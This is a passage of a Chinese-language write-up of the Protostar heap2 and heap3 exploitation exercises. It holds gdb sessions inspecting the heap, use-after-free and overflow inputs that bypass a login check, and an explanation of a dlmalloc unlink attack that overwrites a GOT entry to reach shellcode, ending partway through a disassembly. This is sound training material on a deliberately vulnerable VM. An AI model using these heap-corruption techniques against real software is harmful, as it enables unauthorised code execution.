+<span class="o">[</span> <span class="nv">auth</span> <span class="o">=</span> <span class="o">(</span>nil<span class="o">)</span>, <span class="nv">service</span> <span class="o">=</span> <span class="o">(</span>nil<span class="o">)</span> <span class="o">]</span>
+auth admin
+<span class="o">[</span> <span class="nv">auth</span> <span class="o">=</span> 0x804c008, <span class="nv">service</span> <span class="o">=</span> <span class="o">(</span>nil<span class="o">)</span> <span class="o">]</span>
+^C
+Program received signal SIGINT, Interrupt.
+0xb7f53c1e <span class="k">in</span> __read_nocancel <span class="o">()</span> at ../sysdeps/unix/syscall-template.S:82
+<span class="m">82</span>  ../sysdeps/unix/syscall-template.S: No such file or directory.
+  <span class="k">in</span> ../sysdeps/unix/syscall-template.S
+Current language:  auto
+The current <span class="nb">source</span> language is <span class="s2">&quot;auto; currently asm&quot;</span>.
+<span class="o">(</span>gdb<span class="o">)</span> info proc mappings
+process <span class="m">7281</span>
+<span class="nv">cmdline</span> <span class="o">=</span> <span class="s1">&#39;/opt/protostar/bin/heap2&#39;</span>
+<span class="nv">cwd</span> <span class="o">=</span> <span class="s1">&#39;/opt/protostar/bin&#39;</span>
+<span class="nv">exe</span> <span class="o">=</span> <span class="s1">&#39;/opt/protostar/bin/heap2&#39;</span>
+Mapped address spaces:
+
+  Start Addr   End Addr       Size     Offset objfile
+  0x8048000  0x804b000     0x3000          <span class="m">0</span>        /opt/protostar/bin/heap2
+  0x804b000  0x804c000     0x1000     0x3000        /opt/protostar/bin/heap2
+  0x804c000  0x804d000     0x1000          <span class="m">0</span>           <span class="o">[</span>heap<span class="o">]</span>
+  0xb7e96000 0xb7e97000     0x1000          <span class="m">0</span>        
+  0xb7e97000 0xb7fd5000   0x13e000          <span class="m">0</span>         /lib/libc-2.11.2.so
+  0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
+  0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
+  0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
+  0xb7fd9000 0xb7fdc000     0x3000          <span class="m">0</span>        
+  0xb7fde000 0xb7fe2000     0x4000          <span class="m">0</span>        
+  0xb7fe2000 0xb7fe3000     0x1000          <span class="m">0</span>           <span class="o">[</span>vdso<span class="o">]</span>
+  0xb7fe3000 0xb7ffe000    0x1b000          <span class="m">0</span>         /lib/ld-2.11.2.so
+  0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
+  0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
+  0xbffeb000 0xc0000000    0x15000          <span class="m">0</span>           <span class="o">[</span>stack<span class="o">]</span>
+<span class="o">(</span>gdb<span class="o">)</span> <span class="nb">break</span> *0x0804895f <span class="c1"># call   0x804881c &lt;printf@plt&gt;</span>
+Breakpoint <span class="m">1</span> at 0x804895f: file heap2/heap2.c, line <span class="m">20</span>.
+<span class="o">(</span>gdb<span class="o">)</span> <span class="nb">command</span>  <span class="c1"># define what gdb commands shall be executed when the breakpoint is hit</span>
+Type commands <span class="k">for</span> when breakpoint <span class="m">1</span> is hit, one per line.
+End with a line saying just <span class="s2">&quot;end&quot;</span>.
+&gt;echo -------------------------------------------------<span class="se">\n</span>
+&gt;x/20wx 0x804c000 <span class="c1"># print the heap</span>
+&gt;echo --------auth-------------------------------------<span class="se">\n</span>
+&gt;print *auth
+&gt;echo --------service----------------------------------<span class="se">\n</span>
+&gt;print service
+&gt;echo -------------------------------------------------<span class="se">\n</span>
+&gt;continue
+&gt;end
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="o">(</span>gdb<span class="o">)</span> r
+Starting program: /opt/protostar/bin/heap2 
+
+Breakpoint <span class="m">1</span>, 0x0804895f <span class="k">in</span> main <span class="o">(</span><span class="nv">argc</span><span class="o">=</span><span class="m">1</span>, <span class="nv">argv</span><span class="o">=</span>0xbffff754<span class="o">)</span> at heap2/heap2.c:20
+<span class="m">20</span>  <span class="k">in</span> heap2/heap2.c
+Current language:  auto
+The current <span class="nb">source</span> language is <span class="s2">&quot;auto; currently c&quot;</span>.
+-------------------------------------------------
+0x804c000:  Cannot access memory at address 0x804c000
+<span class="o">(</span>gdb<span class="o">)</span> c
+Continuing.
+<span class="o">[</span> <span class="nv">auth</span> <span class="o">=</span> <span class="o">(</span>nil<span class="o">)</span>, <span class="nv">service</span> <span class="o">=</span> <span class="o">(</span>nil<span class="o">)</span> <span class="o">]</span>
+auth admin
+
+Breakpoint <span class="m">1</span>, 0x0804895f <span class="k">in</span> main <span class="o">(</span><span class="nv">argc</span><span class="o">=</span><span class="m">1</span>, <span class="nv">argv</span><span class="o">=</span>0xbffff754<span class="o">)</span> at heap2/heap2.c:20
+<span class="m">20</span>  <span class="k">in</span> heap2/heap2.c
+-------------------------------------------------
+0x804c000:  0x00000000  0x00000011  0x696d6461  0x00000a6e
+<span class="c1"># 实际上 sizeof(auth) 返回的是指针 auth 的大小（4 bytes）而不是结构体 auth</span>
+<span class="c1"># 考虑到对齐，所以这里只分配了 8 字节（8 bytes header + 8 bytes data）</span>
+0x804c010:  0x00000000  0x00000ff1  0x00000000  0x00000000
+0x804c020:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c030:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c040:  0x00000000  0x00000000  0x00000000  0x00000000
+--------auth-------------------------------------
+<span class="nv">$5</span> <span class="o">=</span> <span class="o">{</span><span class="nv">name</span> <span class="o">=</span> <span class="s2">&quot;admin\n\000\000\000\000\000\000\361\017&quot;</span>, <span class="s1">&#39;\000&#39;</span> &lt;repeats <span class="m">17</span> times&gt;, <span class="nv">auth</span> <span class="o">=</span> <span class="m">0</span><span class="o">}</span>
+--------service----------------------------------
+<span class="nv">$6</span> <span class="o">=</span> 0x0
+-------------------------------------------------
+<span class="o">[</span> <span class="nv">auth</span> <span class="o">=</span> 0x804c008, <span class="nv">service</span> <span class="o">=</span> <span class="o">(</span>nil<span class="o">)</span> <span class="o">]</span>
+reset
+
+Breakpoint <span class="m">1</span>, 0x0804895f <span class="k">in</span> main <span class="o">(</span><span class="nv">argc</span><span class="o">=</span><span class="m">1</span>, <span class="nv">argv</span><span class="o">=</span>0xbffff754<span class="o">)</span> at heap2/heap2.c:20
+<span class="m">20</span>  <span class="k">in</span> heap2/heap2.c
+-------------------------------------------------
+<span class="c1"># the first word of the chunk data got replaced with 0</span>
+<span class="c1"># because the first word in a free chunk is defined as the previous free chunk address</span>
+<span class="c1"># free chunks 是链表，因为没有其它 free chunk，所以为空</span>
+0x804c000:  0x00000000  0x00000011  0x00000000  0x00000a6e
+0x804c010:  0x00000000  0x00000ff1  0x00000000  0x00000000
+0x804c020:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c030:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c040:  0x00000000  0x00000000  0x00000000  0x00000000
+--------auth-------------------------------------
+<span class="nv">$7</span> <span class="o">=</span> <span class="o">{</span><span class="nv">name</span> <span class="o">=</span> <span class="s2">&quot;\000\000\000\000n\n\000\000\000\000\000\000\361\017&quot;</span>, <span class="s1">&#39;\000&#39;</span> &lt;repeats <span class="m">17</span> times&gt;, <span class="nv">auth</span> <span class="o">=</span> <span class="m">0</span><span class="o">}</span>
+--------service----------------------------------
+<span class="nv">$8</span> <span class="o">=</span> 0x0
+-------------------------------------------------
+<span class="o">[</span> <span class="nv">auth</span> <span class="o">=</span> 0x804c008, <span class="nv">service</span> <span class="o">=</span> <span class="o">(</span>nil<span class="o">)</span> <span class="o">]</span>
+service AAA
+
+Breakpoint <span class="m">1</span>, 0x0804895f <span class="k">in</span> main <span class="o">(</span><span class="nv">argc</span><span class="o">=</span><span class="m">1</span>, <span class="nv">argv</span><span class="o">=</span>0xbffff754<span class="o">)</span> at heap2/heap2.c:20
+<span class="m">20</span>  <span class="k">in</span> heap2/heap2.c
+-------------------------------------------------
+0x804c000:  0x00000000  0x00000011  0x41414120  0x0000000a
+0x804c010:  0x00000000  0x00000ff1  0x00000000  0x00000000
+0x804c020:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c030:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c040:  0x00000000  0x00000000  0x00000000  0x00000000
+--------auth-------------------------------------
+<span class="nv">$9</span> <span class="o">=</span> <span class="o">{</span><span class="nv">name</span> <span class="o">=</span> <span class="s2">&quot; AAA\n\000\000\000\000\000\000\000\361\017&quot;</span>, <span class="s1">&#39;\000&#39;</span> &lt;repeats <span class="m">17</span> times&gt;, <span class="nv">auth</span> <span class="o">=</span> <span class="m">0</span><span class="o">}</span>
+--------service----------------------------------
+<span class="nv">$10</span> <span class="o">=</span> 0x804c008 <span class="s2">&quot; AAA\n&quot;</span>
+-------------------------------------------------
+<span class="o">[</span> <span class="nv">auth</span> <span class="o">=</span> 0x804c008, <span class="nv">service</span> <span class="o">=</span> 0x804c008 <span class="o">]</span>
+service BBB
+
+Breakpoint <span class="m">1</span>, 0x0804895f <span class="k">in</span> main <span class="o">(</span><span class="nv">argc</span><span class="o">=</span><span class="m">1</span>, <span class="nv">argv</span><span class="o">=</span>0xbffff754<span class="o">)</span> at heap2/heap2.c:20
+<span class="m">20</span>  <span class="k">in</span> heap2/heap2.c
+-------------------------------------------------
+0x804c000:  0x00000000  0x00000011  0x41414120  0x0000000a
+0x804c010:  0x00000000  0x00000011  0x42424220  0x0000000a
+0x804c020:  0x00000000  0x00000fe1  0x00000000  0x00000000
+0x804c030:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c040:  0x00000000  0x00000000  0x00000000  0x00000000
+--------auth-------------------------------------
+<span class="nv">$11</span> <span class="o">=</span> <span class="o">{</span><span class="nv">name</span> <span class="o">=</span> <span class="s2">&quot; AAA\n\000\000\000\000\000\000\000\021\000\000\000 BBB\n\000\000\000\000\000\000\000\341\017\000&quot;</span>, <span class="nv">auth</span> <span class="o">=</span> <span class="m">0</span><span class="o">}</span>
+--------service----------------------------------
+<span class="nv">$12</span> <span class="o">=</span> 0x804c018 <span class="s2">&quot; BBB\n&quot;</span>
+-------------------------------------------------
+<span class="o">[</span> <span class="nv">auth</span> <span class="o">=</span> 0x804c008, <span class="nv">service</span> <span class="o">=</span> 0x804c018 <span class="o">]</span>
+service CCC
+
+Breakpoint <span class="m">1</span>, 0x0804895f <span class="k">in</span> main <span class="o">(</span><span class="nv">argc</span><span class="o">=</span><span class="m">1</span>, <span class="nv">argv</span><span class="o">=</span>0xbffff754<span class="o">)</span> at heap2/heap2.c:20
+<span class="m">20</span>  <span class="k">in</span> heap2/heap2.c
+-------------------------------------------------
+0x804c000:  0x00000000  0x00000011  0x41414120  0x0000000a
+0x804c010:  0x00000000  0x00000011  0x42424220  0x0000000a
+0x804c020:  0x00000000  0x00000011  0x43434320  0x0000000a
+0x804c030:  0x00000000  0x00000fd1  0x00000000  0x00000000
+0x804c040:  0x00000000  0x00000000  0x00000000  0x00000000
+--------auth-------------------------------------
+<span class="c1"># struct auth {</span>
+<span class="c1">#   char name[32];</span>
+<span class="c1">#   int auth;</span>
+<span class="c1"># };</span>
+<span class="c1"># 0x804c008 + 0x20 = 0x804c028</span>
+<span class="nv">$13</span> <span class="o">=</span> <span class="o">{</span><span class="nv">name</span> <span class="o">=</span> <span class="s2">&quot; AAA\n\000\000\000\000\000\000\000\021\000\000\000 BBB\n\000\000\000\000\000\000\000\021\000\000&quot;</span>, <span class="nv">auth</span> <span class="o">=</span> <span class="m">1128481568</span><span class="o">}</span>  <span class="c1"># 0x43434320</span>
+--------service----------------------------------
+<span class="nv">$14</span> <span class="o">=</span> 0x804c028 <span class="s2">&quot; CCC\n&quot;</span>
+-------------------------------------------------
+<span class="o">[</span> <span class="nv">auth</span> <span class="o">=</span> 0x804c008, <span class="nv">service</span> <span class="o">=</span> 0x804c028 <span class="o">]</span>
+login
+you have logged <span class="k">in</span> already!
+</code></pre></div>
+</li>
+<li>
+<p>由于动态分配大小错误，也可以直接覆盖</p>
+<div class="highlight"><pre><span></span><code><span class="o">(</span>gdb<span class="o">)</span> r
+Starting program: /opt/protostar/bin/heap2 
+
+Breakpoint <span class="m">1</span>, 0x0804895f <span class="k">in</span> main <span class="o">(</span><span class="nv">argc</span><span class="o">=</span><span class="m">1</span>, <span class="nv">argv</span><span class="o">=</span>0xbffff754<span class="o">)</span> at heap2/heap2.c:20
+<span class="m">20</span>  <span class="k">in</span> heap2/heap2.c
+Current language:  auto
+The current <span class="nb">source</span> language is <span class="s2">&quot;auto; currently c&quot;</span>.
+-------------------------------------------------
+0x804c000:  Cannot access memory at address 0x804c000
+<span class="o">(</span>gdb<span class="o">)</span> c
+Continuing.
+<span class="o">[</span> <span class="nv">auth</span> <span class="o">=</span> <span class="o">(</span>nil<span class="o">)</span>, <span class="nv">service</span> <span class="o">=</span> <span class="o">(</span>nil<span class="o">)</span> <span class="o">]</span>
+auth admin
+
+Breakpoint <span class="m">1</span>, 0x0804895f <span class="k">in</span> main <span class="o">(</span><span class="nv">argc</span><span class="o">=</span><span class="m">1</span>, <span class="nv">argv</span><span class="o">=</span>0xbffff754<span class="o">)</span> at heap2/heap2.c:20
+<span class="m">20</span>  <span class="k">in</span> heap2/heap2.c
+-------------------------------------------------
+0x804c000:  0x00000000  0x00000011  0x696d6461  0x00000a6e
+0x804c010:  0x00000000  0x00000ff1  0x00000000  0x00000000
+0x804c020:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c030:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c040:  0x00000000  0x00000000  0x00000000  0x00000000
+--------auth-------------------------------------
+<span class="nv">$17</span> <span class="o">=</span> <span class="o">{</span><span class="nv">name</span> <span class="o">=</span> <span class="s2">&quot;admin\n\000\000\000\000\000\000\361\017&quot;</span>, <span class="s1">&#39;\000&#39;</span> &lt;repeats <span class="m">17</span> times&gt;, <span class="nv">auth</span> <span class="o">=</span> <span class="m">0</span><span class="o">}</span>
+--------service----------------------------------
+<span class="nv">$18</span> <span class="o">=</span> 0x0
+-------------------------------------------------
+<span class="o">[</span> <span class="nv">auth</span> <span class="o">=</span> 0x804c008, <span class="nv">service</span> <span class="o">=</span> <span class="o">(</span>nil<span class="o">)</span> <span class="o">]</span>
+service AAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Breakpoint <span class="m">1</span>, 0x0804895f <span class="k">in</span> main <span class="o">(</span><span class="nv">argc</span><span class="o">=</span><span class="m">1</span>, <span class="nv">argv</span><span class="o">=</span>0xbffff754<span class="o">)</span> at heap2/heap2.c:20
+<span class="m">20</span>  <span class="k">in</span> heap2/heap2.c
+-------------------------------------------------
+0x804c000:  0x00000000  0x00000011  0x696d6461  0x00000a6e
+0x804c010:  0x00000000  0x00000029  0x41414120  0x41414141
+0x804c020:  0x41414141  0x41414141  0x41414141  0x41414141
+0x804c030:  0x41414141  0x0000000a  0x00000000  0x00000fc9
+0x804c040:  0x00000000  0x00000000  0x00000000  0x00000000
+--------auth-------------------------------------
+<span class="nv">$19</span> <span class="o">=</span> <span class="o">{</span><span class="nv">name</span> <span class="o">=</span> <span class="s2">&quot;admin\n\000\000\000\000\000\000)\000\000\000 &quot;</span>, <span class="s1">&#39;A&#39;</span> &lt;repeats <span class="m">15</span> times&gt;, <span class="nv">auth</span> <span class="o">=</span> <span class="m">1094795585</span><span class="o">}</span>
+--------service----------------------------------
+<span class="nv">$20</span> <span class="o">=</span> 0x804c018 <span class="s2">&quot; &quot;</span>, <span class="s1">&#39;A&#39;</span> &lt;repeats <span class="m">27</span> times&gt;, <span class="s2">&quot;\n&quot;</span>
+-------------------------------------------------
+<span class="o">[</span> <span class="nv">auth</span> <span class="o">=</span> 0x804c008, <span class="nv">service</span> <span class="o">=</span> 0x804c018 <span class="o">]</span>
+login
+you have logged <span class="k">in</span> already!
+</code></pre></div>
+</li>
+</ul>
+<h3 id="exploit_2">Exploit<a class="headerlink" href="#exploit_2" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="c1"># use after free</span>
+$ ./heap2
+<span class="o">[</span> <span class="nv">auth</span> <span class="o">=</span> <span class="o">(</span>nil<span class="o">)</span>, <span class="nv">service</span> <span class="o">=</span> <span class="o">(</span>nil<span class="o">)</span> <span class="o">]</span>
+auth admin
+<span class="o">[</span> <span class="nv">auth</span> <span class="o">=</span> 0x804c008, <span class="nv">service</span> <span class="o">=</span> <span class="o">(</span>nil<span class="o">)</span> <span class="o">]</span>
+reset
+<span class="o">[</span> <span class="nv">auth</span> <span class="o">=</span> 0x804c008, <span class="nv">service</span> <span class="o">=</span> <span class="o">(</span>nil<span class="o">)</span> <span class="o">]</span>
+service AAA
+<span class="o">[</span> <span class="nv">auth</span> <span class="o">=</span> 0x804c008, <span class="nv">service</span> <span class="o">=</span> 0x804c008 <span class="o">]</span>
+service BBB
+<span class="o">[</span> <span class="nv">auth</span> <span class="o">=</span> 0x804c008, <span class="nv">service</span> <span class="o">=</span> 0x804c018 <span class="o">]</span>
+service CCC
+<span class="o">[</span> <span class="nv">auth</span> <span class="o">=</span> 0x804c008, <span class="nv">service</span> <span class="o">=</span> 0x804c028 <span class="o">]</span>
+login
+you have logged <span class="k">in</span> already!
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="c1"># simple overwrite</span>
+$ ./heap2
+<span class="o">[</span> <span class="nv">auth</span> <span class="o">=</span> <span class="o">(</span>nil<span class="o">)</span>, <span class="nv">service</span> <span class="o">=</span> <span class="o">(</span>nil<span class="o">)</span> <span class="o">]</span>
+auth admin
+<span class="o">[</span> <span class="nv">auth</span> <span class="o">=</span> 0x804c008, <span class="nv">service</span> <span class="o">=</span> <span class="o">(</span>nil<span class="o">)</span> <span class="o">]</span>
+service AAAAAAAAAAAAAAAAAAAAAAA
+<span class="o">[</span> <span class="nv">auth</span> <span class="o">=</span> 0x804c008, <span class="nv">service</span> <span class="o">=</span> 0x804c018 <span class="o">]</span>
+login
+you have logged <span class="k">in</span> already!
+</code></pre></div>
+<h2 id="heap-3">Heap 3<a class="headerlink" href="#heap-3" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>the Doug Lea Malloc (dlmalloc)</p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/types.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+
+<span class="kt">void</span><span class="w"> </span><span class="nf">winner</span><span class="p">()</span><span class="w"></span>
+<span class="p">{</span><span class="w"></span>
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;that wasn&#39;t too bad now, was it? @ %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">)</span><span class="w"></span>
+<span class="p">{</span><span class="w"></span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">a</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">b</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">c</span><span class="p">;</span><span class="w"></span>
+
+<span class="w">  </span><span class="n">a</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="mi">32</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="n">b</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="mi">32</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="n">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="mi">32</span><span class="p">);</span><span class="w"></span>
+
+<span class="w">  </span><span class="n">strcpy</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="w"> </span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span><span class="w"> </span><span class="c1">// can&#39;t deal with null bytes</span>
+<span class="w">  </span><span class="n">strcpy</span><span class="p">(</span><span class="n">b</span><span class="p">,</span><span class="w"> </span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span><span class="w"></span>
+<span class="w">  </span><span class="n">strcpy</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="w"> </span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]);</span><span class="w"></span>
+
+<span class="w">  </span><span class="n">free</span><span class="p">(</span><span class="n">c</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="n">free</span><span class="p">(</span><span class="n">b</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="n">free</span><span class="p">(</span><span class="n">a</span><span class="p">);</span><span class="w"></span>
+
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;dynamite failed?</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</code></pre></div>
+<ul>
+<li>
+<p>通过 <a href="../../static/malloc.c"><code>malloc</code></a> 的 <code>unlink</code> 修改 <code>GOT</code> 表条目，<code>FD-&gt;bk</code> 对应目标 <code>GOT</code> 表条目地址，<code>BK</code> 指向 shellcode 的起始地址</p>
+<ul>
+<li>注意有 <code>BK-&gt;fd</code> 写回</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="cp">#define unlink(P, BK, FD) {</span>
+<span class="w">  </span><span class="n">FD</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">P</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">;</span><span class="w">              </span>
+<span class="w">  </span><span class="n">BK</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">P</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span><span class="w">              </span>
+<span class="w">  </span><span class="n">FD</span><span class="o">-&gt;</span><span class="n">bk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">BK</span><span class="p">;</span><span class="w">             </span>
+<span class="w">  </span><span class="n">BK</span><span class="o">-&gt;</span><span class="n">fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">FD</span><span class="p">;</span><span class="w">             </span>
+<span class="p">}</span><span class="w"></span>
+</code></pre></div>
+</li>
+<li>
+<p>Overflow <code>b</code> 修改 <code>c</code> 对应 chunk 的大小使其大于 <code>MAX_FAST_SIZE 80</code>，Overflow <code>c</code> 来构造 fake chunk 控制 <code>unlink</code>，用于调用函数 <code>winner</code> 的 shellcode 可放于 <code>a</code> 中</p>
+<ul>
+<li>fake chunk 的 <code>prev_inuse</code> 位需设置为 0</li>
+<li>
+<p>注意 <code>free</code> 会修改 chunk 的 forward pointer，即 data 域的首 <span class="arithmatex">\(4\)</span> 字节</p>
+<table>
+<thead>
+<tr>
+<th>prev_size</th>
+<th>size</th>
+<th><span style="color: red">fd</span></th>
+<th>bk</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+</li>
+</ul>
+</li>
+<li>
+<p>fake chunk 的 next chunk 的 <code>prev_inuse</code> 位同样应为 0，从而能调用 <code>unlink</code></p>
+<div class="highlight"><pre><span></span><code><span class="n">nextinuse</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">inuse_bit_at_offset</span><span class="p">(</span><span class="n">nextchunk</span><span class="p">,</span><span class="w"> </span><span class="n">nextsize</span><span class="p">);</span><span class="w"></span>
+
+<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">nextinuse</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">  </span><span class="n">unlink</span><span class="p">(</span><span class="n">nextchunk</span><span class="p">,</span><span class="w"> </span><span class="n">bck</span><span class="p">,</span><span class="w"> </span><span class="n">fwd</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="n">size</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">nextsize</span><span class="p">;</span><span class="w"></span>
+<span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"></span>
+<span class="n">clear_inuse_bit_at_offset</span><span class="p">(</span><span class="n">nextchunk</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span><span class="w"></span>
+</code></pre></div>
+</li>
+<li>
+<p>next chunk 的起始地址根据当前 chunk 的起始地址和 size 进行计算，可以设置 size 为 <code>0xfffffffc</code>，实际计算等同于 -4，避免了 null 字节也无需再构造一个 chunk</p>
+</li>
+<li>
+<p>查看相关地址信息</p>
+<details class="note">
+<summary>Dump of assembler code for function main</summary>
+<div class="highlight"><pre><span></span><code><span class="o">(</span>gdb<span class="o">)</span> <span class="nb">set</span> disassembly-flavor intel
+<span class="o">(</span>gdb<span class="o">)</span> disassemble main
+Dump of assembler code <span class="k">for</span> <span class="k">function</span> main:
+0x08048889 &lt;main+0&gt;:    push   ebp
+0x0804888a &lt;main+1&gt;:    mov    ebp,esp
+0x0804888c &lt;main+3&gt;:    and    esp,0xfffffff0
+0x0804888f &lt;main+6&gt;:    sub    esp,0x20
+0x08048892 &lt;main+9&gt;:    mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x20
+0x08048899 &lt;main+16&gt;:   call   0x8048ff2 &lt;malloc&gt;
+0x0804889e &lt;main+21&gt;:   mov    DWORD PTR <span class="o">[</span>esp+0x14<span class="o">]</span>,eax
+0x080488a2 &lt;main+25&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x20
+0x080488a9 &lt;main+32&gt;:   call   0x8048ff2 &lt;malloc&gt;
+0x080488ae &lt;main+37&gt;:   mov    DWORD PTR <span class="o">[</span>esp+0x18<span class="o">]</span>,eax
+0x080488b2 &lt;main+41&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x20
+0x080488b9 &lt;main+48&gt;:   call   0x8048ff2 &lt;malloc&gt;
+0x080488be &lt;main+53&gt;:   mov    DWORD PTR <span class="o">[</span>esp+0x1c<span class="o">]</span>,eax
+0x080488c2 &lt;main+57&gt;:   mov    eax,DWORD PTR <span class="o">[</span>ebp+0xc<span class="o">]</span>
+0x080488c5 &lt;main+60&gt;:   add    eax,0x4
+0x080488c8 &lt;main+63&gt;:   mov    eax,DWORD PTR <span class="o">[</span>eax<span class="o">]</span>
+0x080488ca &lt;main+65&gt;:   mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,eax
+0x080488ce &lt;main+69&gt;:   mov    eax,DWORD PTR <span class="o">[</span>esp+0x14<span class="o">]</span>
+0x080488d2 &lt;main+73&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
+0x080488d5 &lt;main+76&gt;:   call   0x8048750 &lt;strcpy@plt&gt;
+0x080488da &lt;main+81&gt;:   mov    eax,DWORD PTR <span class="o">[</span>ebp+0xc<span class="o">]</span>
+0x080488dd &lt;main+84&gt;:   add    eax,0x8
+0x080488e0 &lt;main+87&gt;:   mov    eax,DWORD PTR <span class="o">[</span>eax<span class="o">]</span>
+0x080488e2 &lt;main+89&gt;:   mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,eax
+0x080488e6 &lt;main+93&gt;:   mov    eax,DWORD PTR <span class="o">[</span>esp+0x18<span class="o">]</span>
+0x080488ea &lt;main+97&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
+0x080488ed &lt;main+100&gt;:  call   0x8048750 &lt;strcpy@plt&gt;
+0x080488f2 &lt;main+105&gt;:  mov    eax,DWORD PTR <span class="o">[</span>ebp+0xc<span class="o">]</span>
+0x080488f5 &lt;main+108&gt;:  add    eax,0xc
+0x080488f8 &lt;main+111&gt;:  mov    eax,DWORD PTR <span class="o">[</span>eax<span class="o">]</span>
+0x080488fa &lt;main+113&gt;:  mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,eax
+0x080488fe &lt;main+117&gt;:  mov    eax,DWORD PTR <span class="o">[</span>esp+0x1c<span class="o">]</span>
+0x08048902 &lt;main+121&gt;:  mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
+0x08048905 &lt;main+124&gt;:  call   0x8048750 &lt;strcpy@plt&gt;
+0x0804890a &lt;main+129&gt;:  mov    eax,DWORD PTR <span class="o">[</span>esp+0x1c<span class="o">]</span>
+0x0804890e &lt;main+133&gt;:  mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
+0x08048911 &lt;main+136&gt;:  call   0x8049824 &lt;free&gt;
+0x08048916 &lt;main+141&gt;:  mov    eax,DWORD PTR <span class="o">[</span>esp+0x18<span class="o">]</span>
+0x0804891a &lt;main+145&gt;:  mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
+0x0804891d &lt;main+148&gt;:  call   0x8049824 &lt;free&gt;
